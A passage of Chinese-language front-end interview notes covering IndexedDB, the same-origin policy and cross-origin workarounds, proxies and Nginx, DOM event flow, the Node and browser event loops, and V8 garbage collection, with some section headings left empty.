| **同源策略限制**            | 只能被同源页面访问，不能跨域访问                             |
| **不随 HTTP 请求发送**      | 与 LocalStorage 一样，存储的数据只在客户端使用，不会随请求发送 |

**典型使用场景**

**离线应用（PWA）**

- 缓存 API 数据、离线存储表单、操作记录

**大型数据存储**

- 保存用户数据、文件、图片 Blob

**结构化查询**

- 利用索引查询特定字段的数据

**浏览器缓存**

- 替代复杂 LocalStorage 或 SessionStorage 缓存

---

**IndexedDB 为什么比 LocalStorage 更适合离线应用？**

- 支持大量数据、事务和异步操作，不阻塞 UI

**IndexedDB 的数据访问是同步还是异步？**

- 异步（可通过事件监听或 Promise 操作）

**IndexedDB 能跨域访问吗？**

- ❌ 不能，只遵守同源策略

**IndexedDB 的缺点？**

- API 相对复杂，需要封装或使用库（如 Dexie.js）

# 7. 浏览器同源策略

## 1. 什么是同源策略

同源策略是浏览器的安全机制，限制不同源网页之间互相访问数据。只有协议、域名、端口都相同的 URL 才算同源。不同源之间无法访问 DOM、Cookie、LocalStorage 或发起 AJAX 请求。跨域可以通过 CORS、JSONP、代理或 postMessage 实现。

同源策略（Same-Origin Policy，SOP）是浏览器的安全机制，限制不同源的网页之间互相读取数据，防止跨站攻击。

**什么是“同源”**

**两个 URL 被认为是同源，需要同时满足三个条件**：

1. **协议相同**（protocol）
   - `http://` vs `https://` → 不同源
2. **域名相同**（host）
   - `www.example.com` vs `api.example.com` → 不同源
3. **端口相同**（port）
   - `http://example.com:80` vs `http://example.com:81` → 不同源

> ✅ 只有三者都相同才算同源

**同源策略限制（面试高频点）**

1. **DOM 操作**
   - 不同源页面不能访问彼此的 DOM
2. **Cookie / LocalStorage / IndexDB**
   - 不同源不能互相读取
3. **AJAX / Fetch 请求**
   - 默认受限，只能请求同源数据
4. **Frame / Iframe**
   - 不同源页面互相操作 DOM 会报错

----

**Cookie 可以跨域吗？**

- 默认不行，可通过 `withCredentials` 配合 CORS 配置

**为什么浏览器要有同源策略？**

- 防止恶意网站读取或篡改用户数据（XSS / CSRF）

**iframe 可以跨域操作吗？**

- 不同源 iframe 不能直接操作 DOM，但可以用 `postMessage` 安全通信

**子域名算同源吗？**

- `a.example.com` 和 `b.example.com` 不同源
- 可通过 `document.domain`（已不推荐）或 postMessage 通信

## 2. 如何解决跨域问题

解决跨源限制的方式

| 方法                     | 说明                                                         |
| ------------------------ | ------------------------------------------------------------ |
| **CORS（跨域资源共享）** | 服务器在响应头加 `Access-Control-Allow-Origin` 允许指定源访问 |
| **JSONP**                | 利用 `<script>` 标签不受 SOP 限制，常用于 GET 请求（已较少使用） |
| **代理**                 | 通过同源服务器转发请求，绕过跨域限制                         |
| **postMessage**          | 不同源页面安全通信，适用于 iframe                            |

## 3. 正向代理和反向代理的区别

正向代理是客户端通过代理访问目标服务器，服务器不知道真实客户端，常用于突破访问限制或隐藏 IP。反向代理是服务器端前置代理接收请求并转发到内部服务器，客户端不知道真实服务器，常用于负载均衡、缓存和安全保护。

| 类型                          | 概念                                                         |
| ----------------------------- | ------------------------------------------------------------ |
| **正向代理（Forward Proxy）** | 客户端向代理服务器发送请求，由代理服务器代替客户端访问目标服务器。客户端知道代理，但服务器不知道真实客户端。 |
| **反向代理（Reverse Proxy）** | 服务器端前置一个代理，由代理服务器接收请求并转发给内部真实服务器。客户端不知道真实服务器，只知道代理。 |

**为什么要用反向代理？**

- 隐藏内部服务器
- 实现负载均衡
- 提供缓存加速
- 统一 HTTPS / SSL 处理

**正向代理和 VPN 的关系？**

- VPN 属于客户端使用的正向代理的一种，实现 IP 隐藏和访问控制

**Nginx 是正向代理还是反向代理？**

- Nginx 常用作反向代理，也可配置成正向代理

## 4. Nginx的概念及其工作原理

Nginx 是高性能的 Web 服务器和反向代理，采用 Master + Worker 架构，Worker 进程使用事件驱动和异步非阻塞 I/O 模型处理请求，从而实现高并发和低内存消耗。Nginx 可用于提供静态资源、反向代理、负载均衡和缓存服务。

Nginx（Engine X）是一款高性能、高并发的 Web 服务器、反向代理服务器和负载均衡器，同时也支持 HTTP、HTTPS、TCP、UDP 等协议。

### 核心特点

1. **高并发、高性能**
   - 采用 **事件驱动（Event-Driven）+ 异步非阻塞** 模型
   - 每个 worker 可以处理上万并发连接
2. **低内存消耗**
   - 与 Apache 的每请求线程模型相比，Nginx 更节省内存
3. **多用途**
   - Web 服务器
   - 反向代理
   - 负载均衡
   - 缓存服务器

-------

**Nginx 为什么比 Apache 高并发？**

- Apache 线程/进程模型，每个请求占一个线程，内存消耗大
- Nginx 使用 **事件驱动 + 异步非阻塞 I/O**，Worker 可同时处理成千上万请求

**Nginx 的 Worker 数量怎么设置？**

- 一般 = CPU 核心数，避免进程切换开销

**Nginx 如何处理静态文件和动态请求？**

- 静态文件 → 直接读取文件返回
- 动态请求 → 转发给后端应用（PHP、Node、Python）

# 8. 浏览器事件机制
## 1. 事件是什么?事件模型/事件流模型?

事件是浏览器对用户或程序行为的响应机制。浏览器采用 DOM 事件流模型，事件依次经历捕获、目标、冒泡三个阶段。通过事件委托可以利用冒泡机制统一处理子元素事件，减少监听数量并提升性能。

> **事件是浏览器在用户或程序触发特定行为时，产生的一种通知机制，用于驱动页面与用户进行交互。**

常见事件：

- 用户行为：`click`、`input`、`keydown`
- 浏览器行为：`load`、`resize`、`scroll`
- 程序触发：`dispatchEvent`

> **事件模型是浏览器中事件从触发到处理的完整传播机制，规定了事件的传播路径和触发顺序。**

浏览器采用的是：
 👉 **DOM 事件流模型（DOM Event Flow）**

## 2. 如何阻止事件冒泡

| 方法                               | 作用                                    |
| ---------------------------------- | --------------------------------------- |
| `event.stopPropagation()`          | 阻止事件向上冒泡                        |
| `event.stopImmediatePropagation()` | 阻止事件冒泡 + 阻止当前元素后续监听函数 |
| `event.preventDefault()`           | 阻止事件默认行为，但不阻止冒泡          |

## 3. 对事件委托的理解

> **把子元素的事件交给父元素处理，利用事件冒泡机制统一监听。**

减少事件绑定数量,动态元素自动生效,降低内存占用，减少泄漏风险

## 4. 捕获、目标、冒泡/DOM事件流/事件触发的过程是怎样的

事件触发过程：用户操作或程序触发事件 → 浏览器创建事件对象 → 事件沿 DOM 事件流传播 → 捕获阶段先执行 capture 监听 → 目标阶段执行所有监听 → 冒泡阶段执行默认监听 → 事件处理完毕。事件传播可以被 stopPropagation 或 stopImmediatePropagation 阻止。

DOM 事件流分为捕获、目标和冒泡三个阶段。事件先从 window 向目标元素捕获传播，到达目标元素后执行监听函数，随后再从目标元素向外冒泡返回 window。捕获阶段用于提前拦截事件，冒泡阶段常用于事件委托。

事件触发是指用户或程序产生特定操作（如点击、输入、加载），浏览器创建事件对象，并沿着 DOM 事件流依次执行监听函数的过程。

**捕获阶段（Capturing Phase）**

- 事件从最外层的 `window` → `document` → `html` → `body` → 父元素 → 子元素
- 用于“提前拦截”事件
- 监听函数要加第三个参数 `true` 才会在此阶段执行

**目标阶段（Target Phase）**

- 事件到达真正触发事件的元素（目标元素）
- 捕获和冒泡监听函数都会在目标阶段执行

**冒泡阶段（Bubbling Phase）**

- 事件从目标元素 → 父元素 → body → html → document → window
- 默认监听阶段
- 事件委托依赖此机制

```css
window
 ↓
document
 ↓
html
 ↓
body
 ↓
parent
 ↓
target（目标阶段）
 ↑
parent
 ↑
body
 ↑
html
 ↑
document
 ↑
window

```

```js
parent.addEventListener('click', () => {
  console.log('parent 冒泡');
});

parent.addEventListener('click', () => {
  console.log('parent 捕获');
}, true);

child.addEventListener('click', () => {
  console.log('child');
});

parent.addEventListener('click', fn, true);
// 当 click 事件在“捕获阶段”经过 parent 元素时，就执行 fn
```

`addEventListener` 的第三个参数 `true` 表示**在捕获阶段监听事件**，不传或传 `false` 表示在**冒泡阶段监听事件**。

**为什么需要 capture（设计原因）**

如果只靠冒泡，会有什么问题？

- 事件已经触发到子元素
- 再往上冒泡
- **来不及阻止子元素行为**

捕获的作用

> **允许父元素在事件“到达目标之前”先处理或拦截**

典型场景：

- 权限校验
- 全局拦截
- 日志埋点
- 拖拽、手势系统

## 4. 事件委托的使用场景

事件委托是将子元素事件绑定交给父元素，通过冒泡统一处理。典型场景包括动态列表、表单集中处理、导航菜单以及 SPA 根节点事件绑定。优势是减少内存消耗、动态元素自动生效，并便于统一管理。

## 5. 同步和异步的区别

同步（Synchronous）是按顺序执行，前一个任务未完成，后一个任务不能执行；异步（Asynchronous）是任务可以先挂起，后续任务先执行，前一个任务完成后再处理结果。

| 区别     | 同步                              | 异步                                             |
| -------- | --------------------------------- | ------------------------------------------------ |
| 执行顺序 | 按代码顺序执行                    | 不阻塞后续代码执行                               |
| 阻塞性   | 阻塞线程                          | 不阻塞线程                                       |
| 结果处理 | 立即得到                          | 通过回调 / Promise / async-await 获取            |
| 常见示例 | `console.log`, 数组循环, 函数调用 | setTimeout, fetch / AJAX, Promise, eventListener |

1. **JS 是单线程**
   - 同步任务阻塞主线程
   - 异步通过 **事件循环（Event Loop）** 调度执行
2. **异步方式多样**
   - 定时器：`setTimeout`, `setInterval`
   - 网络请求：`fetch`, `XMLHttpRequest`
   - Promise / async-await
   - 事件监听：`click`, `load`
3. **微任务与宏任务**
   - **微任务（Microtask）**：Promise.then / process.nextTick
   - **宏任务（Macrotask）**：setTimeout / setInterval / I/O

## 6. 对事件循环的理解

## 7. 宏任务和微任务分别有哪些
## 8. 什么是执行栈

执行栈（Call Stack）是 JavaScript 用来管理函数调用和执行顺序的数据结构，遵循“后进先出（LIFO）”原则。

### Q1：执行栈溢出（stack overflow）是什么？

> 函数递归没有终止条件，栈无限增长导致溢出

```
function f() { f(); }
f(); // 栈溢出
```

------

### Q2：执行栈和作用域链关系？

> 执行栈存储 **执行上下文**，其中包含 **作用域链**，JS 查找变量是通过作用域链访问的。

------

### Q3：异步函数执行时，执行栈在干什么？

> 异步函数本身调用（注册）入栈，回调函数等到栈空才入栈执行

## 9. Node 中的 Event Loop 和浏览器中的有什么区别？

Node.js 和浏览器的 Event Loop 都是单线程的事件循环机制，但 Node 划分了明确阶段：timers → pending → poll → check → close callbacks，并且独有 process.nextTick 队列，优先于 Promise.then；浏览器 Event Loop 简单一些，只有同步任务 → 微任务 → 宏任务的循环。setImmediate、setTimeout、Promise 在 Node 中的执行顺序与浏览器略有不同。

Node.js Event Loop 阶段顺序（面试必背）

| 阶段                  | 典型任务                  |
| --------------------- | ------------------------- |
| **timers**            | setTimeout、setInterval   |
| **pending callbacks** | 上轮循环的 I/O 回调       |
| **idle, prepare**     | 内部使用                  |
| **poll**              | 轮询 I/O 事件，执行回调   |
| **check**             | setImmediate 回调         |
| **close callbacks**   | socket 或 handle 关闭回调 |

**微任务（Microtasks）执行规则：**

- **process.nextTick 队列** → **所有微任务队列** → 下一阶段
- 所以 `process.nextTick` **比 Promise.then 更优先**

```js
同步代码 → process.nextTick → Promise.then → 宏任务（timers/setImmediate/I/O）
```

**process.nextTick 和 Promise.then 谁先执行？**

> process.nextTick 优先执行。

**Node 的 setImmediate 和 setTimeout(0) 谁先执行？**

> Depends on context：

- 在 I/O 回调中，setImmediate > setTimeout(0)
- 在主模块中，setTimeout(0) > setImmediate

**浏览器有 process.nextTick 吗？**

> 没有，浏览器只能用微任务（Promise.then / MutationObserver）

## 10. process.nextTick 执行顺序？

`process.nextTick` 是 Node.js 独有微任务队列，用于在当前操作结束后立即执行回调，优先于 Promise.then 和宏任务（setTimeout / setImmediate）。执行顺序是：`同步代码 → process.nextTick → Promise.then → 宏任务`

**process.nextTick 和 Promise.then 的区别？**

- nextTick **优先级更高**，在当前阶段结束前执行
- Promise.then 属于普通微任务，在 nextTick 之后执行

**为什么需要 process.nextTick？**

- 在事件循环的当前阶段“插队”，保证回调立即执行
- 避免延迟，常用于 I/O 前清理任务或初始化

**nextTick 会阻塞事件循环吗？**

- 如果 nextTick 队列无限增长，会**阻塞宏任务**
- 可能导致 I/O 回调无法执行 → 注意滥用



# 9. 浏览器垃圾回收机制

## 1. V8的垃圾回收机制是怎样的

V8 通过分代回收机制，新生代使用复制算法快速回收，老生代使用标记清除和标记整理，并结合增量和并发 GC，在保证性能的同时尽量减少页面和 Node 进程的卡顿。

V8（Chrome / Node.js 使用的 JavaScript 引擎）的**垃圾回收（Garbage Collection, GC）机制**是一个**分代 + 标记清理为核心、并发/增量优化**的系统，目标是在**保证高性能的同时尽量减少 JS 线程卡顿（Stop-The-World）**。

### 一、为什么要分代（面试官常追问）

> 基于**分代假说**：
> **大多数对象生命周期很短，少部分对象会长期存活**

所以对不同生命周期的对象采用不同 GC 策略，提升性能。

------

### 二、V8 的内存划分（必答）

#### 1️⃣ 新生代（Young Generation）

- 存放生命周期短的小对象
- 空间小、GC 频繁、回收快

**回收算法：Scavenge（复制算法）**

**特点：**

- From Space / To Space
- 只复制存活对象
- 回收后无内存碎片
- 存活多次或空间不足会 **晋升到老生代**

------

#### 2️⃣ 老生代（Old Generation）

- 存放生命周期长、体积大的对象
- 空间大、GC 次数少

**回收算法：**

- **Mark-Sweep（标记清除）**
- **Mark-Compact（标记整理）**

**区别：**

- Mark-Sweep：速度快，但会产生碎片
- Mark-Compact：整理内存，减少碎片，但成本更高

------

### 三、GC 的核心判断依据（加分点）

> **V8 使用“可达性分析”判断对象是否存活**

从 **GC Roots** 出发：

- 全局对象（window / global）
- 当前执行栈
- 闭包引用
- 原生层（DOM / Node C++）引用

**可达 = 存活，不可达 = 回收**

------

### 四、如何减少 GC 卡顿（高频追问）

V8 为了降低 **Stop-The-World**，引入了多种优化：

#### 1️⃣ 增量 GC（Incremental GC）

- 将一次 GC 拆分为多段执行
- 与 JS 执行交替进行

#### 2️⃣ 并发 GC（Concurrent GC）

- 标记阶段和 JS 线程并发执行
- 降低主线程阻塞时间

#### 3️⃣ 空闲 GC（Idle GC）

- 浏览器空闲时回收

#### 4️⃣ 写屏障（Write Barrier）

- 解决跨代引用，防止新生代对象被误回收


## 2. 哪些操作会造成内存泄漏?

常见内存泄漏包括：全局变量、闭包滥用、定时器和事件未清理、DOM 引用、无限缓存等，本质都是对象仍被 GC Roots 引用，导致无法回收。

事件委托为什么能减少内存泄漏 - 减少事件处理函数数量，避免大量闭包和 DOM 引用。

-------

- DOM 事件的类型和事件流机制?
- 什么是事件代理/事件委托？应用场景？
- 事件捕捉/事件冒泡/事件流 eventflow

